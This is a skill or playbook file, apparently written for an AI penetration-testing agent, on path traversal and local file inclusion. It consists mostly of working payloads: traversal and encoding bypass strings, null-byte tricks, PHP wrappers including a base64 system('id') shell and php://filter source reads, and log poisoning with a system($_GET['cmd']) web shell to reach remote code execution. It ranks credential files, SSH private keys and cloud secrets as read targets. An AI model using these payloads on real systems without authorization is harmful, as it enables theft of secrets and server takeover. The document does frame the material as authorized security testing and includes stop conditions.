---
name: testing-path-traversal
description: Directory traversal and local file inclusion/read testing. Use when parameters reference file paths, filenames, templates, or include directives — identified by parameter names like file, path, page, template, include, doc, folder, dir, img, src, href, or any parameter whose value resembles a filename or path segment. Covers basic traversal, encoding bypass chains, PHP wrapper exploitation, null byte injection, OS-specific techniques, and LFI-to-RCE escalation via log poisoning, wrappers, and file upload chaining.
---

# Path Traversal / LFI Testing

Path traversal lets you read files outside the intended directory. LFI (Local File Inclusion) goes further — the server EXECUTES the included file, not just reads it. The difference is critical: path traversal reads `/etc/passwd`, LFI executes `/var/log/apache2/access.log` containing your injected PHP code → RCE.

## Reference Files

- [payloads.md](./payloads.md) — OS-specific paths, encoding chains, wrapper exploitation, and LFI-to-RCE techniques

## Mental Model

The developer needs to load a file based on user input: a page template, a language file, an image, a document. They write something like:

```python
content = open("/var/www/pages/" + user_input).read()
```

If `user_input` is `../../../../etc/passwd`, the path resolves to `/etc/passwd`. The `../` sequences walk UP the directory tree, escaping the intended directory.

**Key reasoning points:**
1. How many `../` do you need? Depends on how deep the base directory is. `/var/www/html/pages/` needs 4 levels of `../` to reach `/`. But excess `../` is harmless — `/../../../` at the root just stays at root. So `../` × 10 always works.

2. Does the application append an extension? If it adds `.php` → `../../etc/passwd` becomes `../../etc/passwd.php` → file not found. Solutions: null byte (`%00`), path truncation, or target a file with the expected extension.

3. Is it inclusion or just reading? If the file content is EXECUTED (PHP include, JSP include, template include) → any file you can write to becomes code execution.

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (path behavior)    (traverse test)   (declare not vuln)    (read files / RCE)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline

### Step 1.1: Normal Path Behavior
Submit expected value. What does the response contain? Is the file content displayed, included, or used as configuration?

### Step 1.2: Invalid Path
Submit a nonexistent filename. Does the error reveal:
- Full filesystem path? (`/var/www/html/pages/nonexistent.php` → tells you the base directory)
- The web root? (helps calculate `../` count)
- The OS? (Linux paths vs Windows paths)
- The language? (PHP include warning vs Java FileNotFoundException)

### Step 1.3: Extension Behavior
Does the application append an extension to your input?
- Send `test` → does it try to open `test.php`? `test.html`? `test.txt`?
- If yes, you need a null byte or truncation to prevent the extension.

### Step 1.4: Character Probe
Test path characters: `../`, `..%2f`, `%2e%2e%2f`, `..\\`, `....//`, `./`

### Reasoning Checkpoint
```
[PHASE-1] Baseline
[PARAMETER] {name}
[BASE-PATH] {revealed by errors, if any}
[EXTENSION-APPENDED] {yes — what extension / no}
[OS] {Linux / Windows / unknown}
[TRAVERSAL-CHARS] {which accepted / blocked / encoded}
[DECISION] {Proceed / No path behavior — STOP}
```

---

## Phase 2: Confirmation

### Confidence Definitions
| Level | For Path Traversal |
|-------|--------------------|
| HIGH | Known file content appears in response (e.g., `/etc/passwd` contents, `win.ini` contents) |
| MEDIUM | Error messages change with traversal (path-dependent errors) but file content not confirmed |
| LOW | All traversal sequences produce same response as invalid input |

### Step 2.1: Basic Traversal
```
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```
If file content appears → HIGH confidence. Done.

### Step 2.2: Encoding Bypass Chain (if basic fails)
Apply encodings progressively:
```
1. URL encoding:        ..%2f..%2f..%2fetc%2fpasswd
2. Double encoding:     ..%252f..%252f..%252fetc%252fpasswd
3. Unicode/UTF-8:       ..%c0%af..%c0%afetc%c0%afpasswd
4. Mixed:               ..%2f..%5c..%2fetc/passwd
5. Overlong UTF-8:      %c0%ae%c0%ae%c0%af (overlong encoding of ../)
```

### Step 2.3: Traversal Bypass Patterns
```
....//....//....//etc/passwd         (double-dot stripping bypass)
..;/..;/..;/etc/passwd               (semicolon — Java/Tomcat)
..\..\..\etc\passwd                  (backslash on Windows)
..%5c..%5c..%5cetc%5cpasswd         (encoded backslash)
/..../..../..../etc/passwd           (extra slashes)
..%00/..%00/etc/passwd               (null byte in path)
```

### Step 2.4: Null Byte Injection (bypass extension append)
If the app appends `.php` to your input:
```
../../../../etc/passwd%00           (old PHP <5.3.4)
../../../../etc/passwd%00.php
../../../../etc/passwd\0
../../../../etc/passwd%2500         (double-encoded null)
```

### Step 2.5: Path Truncation (bypass extension append)
Long paths exceeding OS path length limit (4096 on Linux, 260 on Windows):
```
../../../../etc/passwd/./././././././[repeat ./ 2000 times]
```
The OS truncates the path, removing the appended extension.

### Step 2.6: PHP Wrapper Exploitation (if PHP)
If the application uses `include()`, `require()`, or `file_get_contents()`:

**Read source code as base64:**
```
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=../config/database
```
Returns base64-encoded source code → decode to read application secrets.

**Execute arbitrary code:** `[EXTERNAL INFRA REQUIRED]` for some
```
php://input              (POST body is executed as PHP)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+   (base64 of <?php system('id');?>)
expect://id              (if expect wrapper enabled)
```

**Max confirmation attempts: 15 across different encoding chains.**

### Reasoning Checkpoint
```
[PHASE-2] Confirmation
[TECHNIQUE] {basic / encoding / bypass pattern / null byte / wrapper}
[RESULT] {file content / error change / nothing}
[FILE-READ] {which file, content summary}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[DECISION] {Proceed / Try encoding bypass / Negative verdict}
```

---

## Negative Verdict

### True Negative Conditions
- All traversal sequences (basic, encoded, double-encoded) blocked
- Application uses allowlist-based file reference (maps input to predefined files)
- Path normalization prevents any directory escape
- Multiple encoding variations tested (at least 5 distinct techniques)

---

## Phase 3: Exploitation

### Level 1: Sensitive File Read
Target files by priority:
- Application config: `.env`, `config.php`, `settings.py`, `application.properties`, `web.config` → contain database creds, API keys
- System files: `/etc/passwd`, `/etc/shadow` (if readable), `win.ini`
- SSH keys: `/home/*/.ssh/id_rsa`, `/root/.ssh/id_rsa`
- Cloud config: `~/.aws/credentials`, `~/.config/gcloud/credentials.db`

### Level 2: Source Code Read (PHP wrappers)
Read application source code to discover further vulnerabilities:
```
php://filter/convert.base64-encode/resource=login
php://filter/convert.base64-encode/resource=admin/dashboard
```

### Level 3: LFI to RCE
If file INCLUSION (not just read) is confirmed:

**Log poisoning:**
1. Inject PHP into a log file via User-Agent: `<?php system($_GET['cmd']); ?>`
2. Include the log: `../../../../var/log/apache2/access.log`
3. The injected PHP executes → RCE

**Via file upload chaining:** Upload a file with PHP code (even with .jpg extension), include it via LFI.

**Stop condition:** Sensitive file read → STOP for path traversal. RCE via LFI → STOP immediately.

---

## Things to Do
- Check error messages for path disclosure — tells you the base directory and how many `../` you need
- Test BOTH forward slash and backslash — some servers accept both
- Try PHP wrappers if the backend is PHP — `php://filter` reveals source code without execution
- Test encoding chains progressively — basic → URL → double → unicode
- Check if the file is READ or INCLUDED — inclusion = potential RCE

## Things Not to Do
- Do not attempt to read /etc/shadow unless you need to prove root-level access
- Do not write files via path traversal without explicit authorization
- Do not forget to test null byte injection if the application appends extensions
- Do not report path traversal on parameters that aren't processed server-side

## Cross-Skill Links
- [[file-upload]] — Upload + LFI = RCE
- [[command-injection]] — LFI to RCE is an alternative to direct command injection
- [[ssrf]] — `file://` protocol in SSRF achieves similar file read
